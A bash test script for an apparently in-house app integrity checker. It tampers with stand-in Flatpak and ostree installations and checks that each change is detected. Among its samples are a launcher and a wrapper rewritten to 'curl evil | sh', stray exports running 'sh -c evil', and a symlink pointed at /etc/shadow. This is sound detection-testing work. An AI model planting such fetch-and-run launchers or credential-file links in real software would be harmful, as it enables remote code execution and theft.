#!/usr/bin/bash
# The app integrity check (APP_INTEGRITY, /usr/libexec/amethystora-integrity) against stand-ins, for 20-tests.sh:
# a Flatpak installation laid out as Flatpak lays one out, from a repository whose commits are signed with a
# throwaway key, a stand-in of the system's ostree repository with a deployment, its composefs image and the boot
# files, and an account's own installation, read as that account. Clean, it finds nothing; each change on its own
# is found, and put back, nothing is found again; what an update does, a second checkout or a chmod to the same
# mode, is never a finding.

set -euo pipefail

INTEGRITY="${1:-/usr/libexec/amethystora-integrity}"
T="$(realpath "$(mktemp -d)")"
trap 'gpgconf --kill gpg-agent 2>/dev/null; rm -rf "${T}"' EXIT
chmod 0755 "${T}"
fail() { echo "test-app-integrity: $*" >&2; exit 1; }

R="${T}/root"
export AMETHYSTORA_INTEGRITY_ROOT="${R}"
FP="${R}/var/lib/flatpak"
STATE="${R}/var/lib/amethystora/security/integrity"
mkdir -p "${R}/etc" "${FP}" "${R}/var/home"

# --- Stand-ins ----------------------------------------------------------------------------------------------------

# Two throwaway keys: the one the system's remote trusts, and another
export GNUPGHOME="${T}/gnupg"
mkdir -m 0700 "${GNUPGHOME}"
gpg --batch --quiet --passphrase '' --quick-gen-key 'Trusted <trusted@example.invalid>' ed25519 sign never
gpg --batch --quiet --passphrase '' --quick-gen-key 'Other <other@example.invalid>' ed25519 sign never
TRUSTED="$(gpg --with-colons --list-keys trusted@example.invalid | awk -F: '$1 == "fpr" { print $10; exit }')"
OTHER="$(gpg --with-colons --list-keys other@example.invalid | awk -F: '$1 == "fpr" { print $10; exit }')"
gpg --batch --export "${TRUSTED}" >"${T}/trusted.gpg"

# An installation: a bare-user-only repository with a remote that checks signatures with the trusted key
installation() {
    mkdir -p "$1"
    ostree init --repo="$1/repo" --mode=bare-user-only
    ostree remote add --repo="$1/repo" --gpg-import="${T}/trusted.gpg" test https://example.invalid/repo
    mkdir -p "$1/exports/share/applications" "$1/exports/bin"
}

# What an app is made of: a program, a data file, an empty file, a link, its metadata and its launcher
source_tree() {
    local src="$1" id="$2"
    mkdir -p "${src}/files/bin" "${src}/files/share" "${src}/export/share/applications"
    printf '#!/bin/sh\necho %s\n' "${id}" >"${src}/files/bin/app"
    chmod 0755 "${src}/files/bin/app"
    printf 'data of %s\n' "${id}" >"${src}/files/share/data"
    : >"${src}/files/share/empty"
    ln -s data "${src}/files/share/link"
    printf '[Application]\nname=%s\nruntime=org.example.Platform/x86_64/stable\n' "${id}" >"${src}/metadata"
    printf '[Desktop Entry]\nName=%s\nExec=app %%U\nIcon=%s\n' "${id}" "${id}" >"${src}/export/share/applications/${id}.desktop"
}

# Commits a tree into an installation, signed with KEY or not, checks it out as Flatpak does, and does what Flatpak
# does then: its deploy data, files/.ref, the launcher rewritten as a new file, the wrapper, the active link and the
# installation's exports. Prints the commit.
deploy() {
    local base="$1" id="$2" src="$3" key="$4" origin="${5:-test}" commit
    commit="$(ostree commit --repo="${base}/repo" --branch="app/${id}/x86_64/stable" --canonical-permissions --no-xattrs \
        ${key:+--gpg-sign="${key}" --gpg-homedir="${GNUPGHOME}"} "${src}")"
    place "${base}" "${id}" "${commit}" "${origin}"
    echo "${commit}"
}

# A commit checked out and made ready as Flatpak does, which a reinstall does again with the same commit; the
# deploy data carries when it was deployed
place() {
    local base="$1" id="$2" commit="$3" origin="$4" dir
    dir="${base}/app/${id}/x86_64/stable/${commit}"
    mkdir -p "${dir%/*}"
    ostree checkout --repo="${base}/repo" -U "${commit}" "${dir}"
    python3 -c 'import sys, time; from gi.repository import GLib
v = GLib.Variant("(ssasta{sv})", (sys.argv[2], sys.argv[3], [], 0, {"timestamp": GLib.Variant("t", time.time_ns())}))
open(sys.argv[1], "wb").write(v.get_data_as_bytes().get_data())' "${dir}/deploy" "${origin}" "${commit}"
    : >"${dir}/files/.ref"
    rm "${dir}/export/share/applications/${id}.desktop"
    printf '[Desktop Entry]\nName=%s\nExec=/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=app --file-forwarding %s @@u %%U @@\nTryExec=/usr/bin/flatpak\nIcon=%s\n' \
        "${id}" "${id}" "${id}" >"${dir}/export/share/applications/${id}.desktop"
    mkdir -p "${dir}/export/bin"
    printf '#!/bin/sh\nexec /usr/bin/flatpak run --branch=stable --arch=x86_64 %s "$@"\n' "${id}" >"${dir}/export/bin/${id}"
    ln -sfn "${commit}" "${dir%/*}/active"
    ln -sfn x86_64/stable "${base}/app/${id}/current"
    ln -sfn "../../../app/${id}/current/active/export/share/applications/${id}.desktop" \
        "${base}/exports/share/applications/${id}.desktop"
    ln -sfn "../../app/${id}/current/active/export/bin/${id}" "${base}/exports/bin/${id}"
}

undeploy() {
    rm -rf "$1/app/$2" "$1/exports/share/applications/$2.desktop" "$1/exports/bin/$2"
}

# The system's Flatpaks: one app, signed with the trusted key, and a cache Flatpak's triggers write
installation "${FP}"
source_tree "${T}/app" org.example.App
COMMIT="$(deploy "${FP}" org.example.App "${T}/app" "${TRUSTED}")"
D="${FP}/app/org.example.App/x86_64/stable/${COMMIT}"
mkdir -p "${D}/files/extra"
printf 'downloaded\n' >"${D}/files/extra/blob"
printf '[MIME Cache]\n' >"${FP}/exports/share/applications/mimeinfo.cache"
object_of() { echo "${FP}/repo/objects/${1:0:2}/${1:2}.file"; }
APP_OBJECT="$(find "${FP}/repo/objects" -samefile "${D}/files/bin/app" | head -n1)"
[[ -n "${APP_OBJECT}" ]] || fail "the checkout did not hardlink the program"

# The system's own: a bare repository with a deployment of it, its composefs image, and the boot files it starts
SYS="${R}/sysroot/ostree"
mkdir -p "${SYS}"
ostree init --repo="${SYS}/repo" --mode=bare
mkdir -p "${T}/os/usr/lib/modules/6.0.0-test" "${T}/os/usr/bin"
head -c 4096 /dev/urandom >"${T}/os/usr/lib/modules/6.0.0-test/vmlinuz"
head -c 8192 /dev/urandom >"${T}/os/usr/lib/modules/6.0.0-test/initramfs.img"
printf '#!/bin/sh\n' >"${T}/os/usr/bin/tool"
OS_COMMIT="$(ostree commit --repo="${SYS}/repo" --branch=os --no-xattrs "${T}/os")"
DEPLOYMENT="${SYS}/deploy/os/deploy/${OS_COMMIT}.0"
mkdir -p "${DEPLOYMENT%/*}"
ostree checkout --repo="${SYS}/repo" -H "${OS_COMMIT}" "${DEPLOYMENT}"
head -c 2048 /dev/urandom >"${DEPLOYMENT}/.ostree.cfs"
BOOTDIR="${R}/boot/ostree/os-0123456789abcdef"
mkdir -p "${BOOTDIR}"
cp "${T}/os/usr/lib/modules/6.0.0-test/vmlinuz" "${BOOTDIR}/vmlinuz-6.0.0-test"
cp "${T}/os/usr/lib/modules/6.0.0-test/initramfs.img" "${BOOTDIR}/initramfs-6.0.0-test.img"
TOOL_OBJECT="$(find "${SYS}/repo/objects" -samefile "${DEPLOYMENT}/usr/bin/tool" | head -n1)"
[[ -n "${TOOL_OBJECT}" ]] || fail "the deployment did not hardlink its files"

# --- Runs ---------------------------------------------------------------------------------------------------------

check() {
    timeout 300 "${INTEGRITY}" || fail "the check failed"
    FOUND="$(jq -r '"\(.id)\t\(.level)\t\(.account)\t\(.text)"' "${STATE}/findings.jsonl")"
}
clean() {
    check
    [[ -z "${FOUND}" ]] || fail "$1, yet something was found: ${FOUND}"
}
found() {
    check
    grep -q -- "$2" <<<"${FOUND}" || fail "$1 was not found: ${FOUND:-nothing}"
}

clean "the first run"
[[ "$(stat -c '%a %U' "${STATE}")" == "700 root" ]] || fail "the state is not root's alone"
jq -e '.flatpak.apps == 1 and .flatpak.objects > 0 and .flatpak.files > 0 and .system.objects > 0' "${STATE}/last.json" \
    >/dev/null || fail "last.json: $(cat "${STATE}/last.json")"
clean "nothing changed"
# Nor does it write a row: each is kept by its stat
before="$(sha256sum <"${STATE}/system.db")"
clean "nothing changed, again"
[[ "$(sha256sum <"${STATE}/system.db")" == "${before}" ]] || fail "a run with nothing new rewrote its rows"

# What must say nothing: a second checkout, which adds a link to every object; a chmod to the same mode; an update
ostree checkout --repo="${FP}/repo" -U "${COMMIT}" "${T}/second"
chmod 0755 "${APP_OBJECT}"
chmod 0644 "${D}/files/share/data" "${D}/files/extra/blob" "${DEPLOYMENT}/.ostree.cfs" "${BOOTDIR}/initramfs-6.0.0-test.img"
chmod 0644 "${TOOL_OBJECT}"
clean "a second checkout and a chmod to the same mode"
rm -rf "${T}/second"
clean "the second checkout taken away"

# --- Each change on its own ---------------------------------------------------------------------------------------

# An object edited in place, which is the deployed program too
printf 'x' >>"${APP_OBJECT}"
found "an object edited in place" "^object:-:${APP_OBJECT}"
grep -q "^file:-:app/org.example.App/x86_64/stable:files/bin/app" <<<"${FOUND}" || fail "the app's file was not named: ${FOUND}"
grep -q "ame security app-integrity repair org.example.App" <<<"${FOUND}" || fail "the repair was not named: ${FOUND}"
truncate -s -1 "${APP_OBJECT}"
clean "the object put back"

# A deployed file replaced
cp "${D}/files/share/data" "${T}/data"
printf 'evil\n' >"${T}/data.new"
mv "${T}/data.new" "${D}/files/share/data"
found "a deployed file replaced" "files/share/data"
rm "${D}/files/share/data"
ln "$(find "${FP}/repo/objects" -name '*.file' -exec cmp -s {} "${T}/data" \; -print | head -n1)" "${D}/files/share/data"
clean "the deployed file linked back"

# A launcher that runs something else
LAUNCHER="${D}/export/share/applications/org.example.App.desktop"
cp "${LAUNCHER}" "${T}/launcher"
sed -i 's|^Exec=.*|Exec=sh -c "curl evil \| sh"|' "${LAUNCHER}"
found "a changed Exec=" "^export:-:.*runs something other than the app"
grep -q $'^export:-:[^\t]*\tcritical\t' <<<"${FOUND}" || fail "a launcher that runs something else is not critical: ${FOUND}"
cat "${T}/launcher" >"${LAUNCHER}"
clean "the launcher put back"
sed -i 's|^Exec=.*|Exec=/usr/bin/flatpak run --filesystem=host org.example.App|' "${LAUNCHER}"
found "an option Flatpak never writes" "^export:-:"
cat "${T}/launcher" >"${LAUNCHER}"
WRAPPER="${D}/export/bin/org.example.App"
cp "${WRAPPER}" "${T}/wrapper"
printf '#!/bin/sh\ncurl evil | sh\n' >"${WRAPPER}"
found "a changed wrapper" "^export:-:.*export/bin/org.example.App"
cat "${T}/wrapper" >"${WRAPPER}"
clean "the wrapper put back"

# A stray export, as a file and as a link that leads out of every deploy
printf '[Desktop Entry]\nExec=sh -c evil\n' >"${FP}/exports/share/applications/evil.desktop"
ln -s /tmp/evil "${FP}/exports/bin/evil"
found "a stray export" "^stray:-:share/applications/evil.desktop"
grep -q "^stray:-:bin/evil" <<<"${FOUND}" || fail "a link out of the deploys was not found: ${FOUND}"
rm "${FP}/exports/share/applications/evil.desktop" "${FP}/exports/bin/evil"
clean "the stray exports taken away"

# A file added to a deploy
printf 'added\n' >"${D}/files/share/added"
found "a file added to a deploy" "was added outside an update: files/share/added"
rm "${D}/files/share/added"
clean "the added file taken away"

# A deleted object, which leaves the deployed file standing
cp -a "${APP_OBJECT}" "${T}/object"
rm "${APP_OBJECT}"
found "a deleted object" "files/bin/app"
ln "${D}/files/bin/app" "${APP_OBJECT}"
clean "the object linked back"

# A link that leads somewhere else
ln -sfn /etc/shadow "${D}/files/share/link"
found "a changed link" "files/share/link"
ln -sfn data "${D}/files/share/link"
clean "the link put back"

# An empty file written
printf 'x' >"${D}/files/share/empty"
found "an empty file written" "files/share/empty"
: >"${D}/files/share/empty"
clean "the empty file emptied"

# Extra data changed
printf 'y' >>"${D}/files/extra/blob"
found "files/extra changed" "files/extra/blob"
truncate -s -1 "${D}/files/extra/blob"
clean "the extra data put back"

# The system's own: an object, the initramfs, and the composefs image
printf 'x' >>"${TOOL_OBJECT}"
found "a system object edited in place" "^system:${TOOL_OBJECT}"
grep -q "reinstall from the installer" <<<"${FOUND}" || fail "the system's finding does not say to reinstall: ${FOUND}"
truncate -s -1 "${TOOL_OBJECT}"
clean "the system object put back"
printf 'z' >>"${BOOTDIR}/initramfs-6.0.0-test.img"
found "an initramfs changed" "^system:${BOOTDIR}/initramfs-6.0.0-test.img"
truncate -s -1 "${BOOTDIR}/initramfs-6.0.0-test.img"
clean "the initramfs put back"
cp "${DEPLOYMENT}/.ostree.cfs" "${T}/cfs"
{ cat "${T}/cfs"; printf 'q'; } >"${T}/cfs.new"
mv "${T}/cfs.new" "${DEPLOYMENT}/.ostree.cfs"
found "a .ostree.cfs replaced" "^system:${DEPLOYMENT}/.ostree.cfs"
cp "${T}/cfs" "${T}/cfs.back"
mv "${T}/cfs.back" "${DEPLOYMENT}/.ostree.cfs"
clean "the .ostree.cfs put back with its own bytes"

# An unsigned app, and one signed by a key no remote of the system's has
source_tree "${T}/unsigned" org.example.Unsigned
deploy "${FP}" org.example.Unsigned "${T}/unsigned" "" >/dev/null
source_tree "${T}/other" org.example.Other
deploy "${FP}" org.example.Other "${T}/other" "${OTHER}" >/dev/null
found "an unsigned app" "^unsigned:-:app/org.example.Unsigned/x86_64/stable"
grep -q "^unknown:-:app/org.example.Other/x86_64/stable" <<<"${FOUND}" || fail "a key the system does not know: ${FOUND}"
undeploy "${FP}" org.example.Unsigned
undeploy "${FP}" org.example.Other
clean "both uninstalled"

# A reinstall, as the repair does it: the old deploy moved aside, as Flatpak moves it into .removed, the same
# commit checked out again into a new folder of the same name, with what Flatpak writes written anew, extra data
# included, and the old one taken away
mkdir -p "${FP}/.removed"
mv "${D}" "${FP}/.removed/org.example.App-${COMMIT}"
place "${FP}" org.example.App "${COMMIT}" test
mkdir -p "${D}/files/extra"
printf 'downloaded\n' >"${D}/files/extra/blob"
rm -rf "${FP}/.removed"
clean "a reinstall of the same commit"

# An update: a new commit deployed, the old one taken away, exports pointing at the new one
printf '#!/bin/sh\necho updated\n' >"${T}/app/files/bin/app"
OLD="${D}"
COMMIT="$(deploy "${FP}" org.example.App "${T}/app" "${TRUSTED}")"
D="${FP}/app/org.example.App/x86_64/stable/${COMMIT}"
rm -rf "${OLD}"
clean "an update"

# --- An account's own installation, read as the account -------------------------------------------------------------

BOB="${R}/var/home/bob"
echo "bob:x:4600:4600::${BOB}:/bin/bash" >"${R}/etc/passwd"
installation "${BOB}/.local/share/flatpak"
source_tree "${T}/bob" org.example.Bobs
deploy "${BOB}/.local/share/flatpak" org.example.Bobs "${T}/bob" "${TRUSTED}" >/dev/null
chown -R 4600:4600 "${BOB}"
touch "${BOB}/.local/share/flatpak/.changed"
export AMETHYSTORA_INTEGRITY_ACCOUNTS=4600
clean "the account's installation, signed by a key the system trusts"
[[ -s "${STATE}/4600.db" && "$(stat -c '%a %U' "${STATE}/4600.db")" == "600 root" ]] || fail "the account's rows are not root's"
setpriv --reuid=4600 --regid=4600 --clear-groups -- test -r "${STATE}/4600.db" &&
    fail "the account can read its rows"
jq -e '.accounts.bob.apps == 1' "${STATE}/last.json" >/dev/null || fail "the account was not counted: $(cat "${STATE}/last.json")"
BOBS="$(find "${BOB}/.local/share/flatpak/app/org.example.Bobs/x86_64/stable" -mindepth 1 -maxdepth 1 -type d)"
setpriv --reuid=4600 --regid=4600 --clear-groups -- sh -c "printf evil >'${BOBS}/files/share/data.new' && mv '${BOBS}/files/share/data.new' '${BOBS}/files/share/data'"
touch "${BOB}/.local/share/flatpak/.changed"
found "a file of the account's own app replaced" $'^bob:file:account:app/org.example.Bobs/x86_64/stable:files/share/data\tcritical\tbob'
# Not looked at again until it changes or a day has gone by, and what it found is still said
found "what the account's run found, kept" "^bob:file:account:"

# The account's own programs can stop or kill its run. It then ends without an answer, and the last run's findings
# stand: the second run in a row that did not end is a finding of its own, so that it does not look like a run that
# found nothing, and a run that ends well starts the count again
mkdir "${T}/cut-bin"
cat >"${T}/cut-bin/timeout" <<STANDIN
#!/usr/bin/bash
[[ "\$1" == 300 ]] && exec /usr/bin/timeout "\$@"
exit 137
STANDIN
chmod 0755 "${T}/cut-bin/timeout"
OLD_PATH="${PATH}"
export PATH="${T}/cut-bin:${PATH}"
# A run that fails every time by itself (a broken installation) is not one something stopped
sed -i 's/^exit 137$/exit 1/' "${T}/cut-bin/timeout"
for _ in 1 2 3; do
    touch "${BOB}/.local/share/flatpak/.changed"
    check
    grep -q "^bob:check-cut" <<<"${FOUND}" && fail "a run that failed by itself was said to be stopped: ${FOUND}"
done
sed -i 's/^exit 1$/exit 137/' "${T}/cut-bin/timeout"
touch "${BOB}/.local/share/flatpak/.changed"
check
grep -q "^bob:check-cut" <<<"${FOUND}" && fail "a run that did not end was said at once: ${FOUND}"
grep -q "^bob:file:account:" <<<"${FOUND}" || fail "the findings of the last run were lost: ${FOUND}"
touch "${BOB}/.local/share/flatpak/.changed"
check
grep -q "^bob:check-cut" <<<"${FOUND}" || fail "a run that did not end twice was not said: ${FOUND}"
export PATH="${OLD_PATH}"
touch "${BOB}/.local/share/flatpak/.changed"
check
grep -q "^bob:check-cut" <<<"${FOUND}" && fail "a run that ended well still said it: ${FOUND}"

# --- The program in the image itself -------------------------------------------------------------------------------

python3 -I -c 'import sqlite3, gi; gi.require_version("OSTree", "1.0"); from gi.repository import OSTree'

echo "test-app-integrity: every change was found, and nothing else"
